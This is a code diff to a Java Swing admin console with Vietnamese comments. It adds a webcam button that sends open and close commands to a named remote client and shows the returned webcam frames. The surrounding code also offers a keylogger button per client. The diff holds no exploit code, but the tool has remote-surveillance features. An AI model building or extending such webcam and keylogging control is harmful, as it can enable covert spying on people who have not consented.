@@ -16,6 +16,7 @@ public class AdminServerApp extends JFrame {
     private JTextArea eventLog;
     private JPanel clientGrid;
     private AdminServerController controller;
+    private JLabel webcamPreviewLabel;
     private JLabel onlineInfoLabel;
     private Map<String, JLabel> screenLabels = new HashMap<String, JLabel>();
     private Map<String, JPanel> clientCards = new HashMap<String, JPanel>();
@@ -938,7 +939,7 @@ public void removeClientCard(String clientName) {
     }
 
     private ImageIcon loadIcon(String fileName, int width, int height) {
-        String path = "assets/icons/" + fileName;
+        String path = "../assets/icons/" + fileName;
         ImageIcon icon = new ImageIcon(path);
 
         if (icon.getIconWidth() == -1) {
@@ -1052,7 +1053,29 @@ public void removeClientCard(String clientName) {
 
     webcamBtn.addActionListener(e -> {
         addLog("[WEBCAM] Open webcam for " + clientName);
-    });
+        
+    // Dùng e.getSource() để lấy chính xác cái nút vừa được bấm
+    // (Nếu code của ông dùng biến khác 'e' như 'event ->' thì đổi chữ 'e' thành 'event' nhé)
+    javax.swing.JButton clickedButton = (javax.swing.JButton) e.getSource();
+
+    // Gọi controller ném lệnh qua mạng tới đúng máy đó
+    if (controller != null) {
+        
+        if (clickedButton.getText().equals("Webcam")) {
+            controller.sendTargetedCommand(clientName, "OPEN_WEBCAM");
+            clickedButton.setText("Stop Webcam"); 
+            
+            // Hiệu ứng chữ đỏ cho ngầu
+            clickedButton.setForeground(java.awt.Color.RED); 
+        } else {
+            controller.sendTargetedCommand(clientName, "CLOSE_WEBCAM");
+            clickedButton.setText("Webcam"); 
+            
+            // Trả lại màu chữ trắng cũ
+            clickedButton.setForeground(java.awt.Color.WHITE); 
+        }
+    }
+});
 
     keyloggerBtn.addActionListener(e -> {
         addLog("[KEYLOGGER] Open keylogger for " + clientName);
@@ -1083,6 +1106,17 @@ public void removeClientCard(String clientName) {
     dialog.setVisible(true);
 }
 
+// Hàm này nhận ảnh từ Controller và đẩy lên UI
+    public void updateWebcamScreen(String clientName, BufferedImage image) {
+        if (webcamPreviewLabel != null && image != null) {
+            // Ép tác vụ vẽ hình ảnh vào luồng Event Dispatch Thread (EDT) để không làm đơ giao diện
+            SwingUtilities.invokeLater(() -> {
+                webcamPreviewLabel.setText(""); // Xóa dòng chữ mặc định đi
+                webcamPreviewLabel.setIcon(new ImageIcon(image));
+                webcamPreviewLabel.repaint();
+            });
+        }
+    }
 
     public static void main(String[] args) {
         SwingUtilities.invokeLater(() -> {
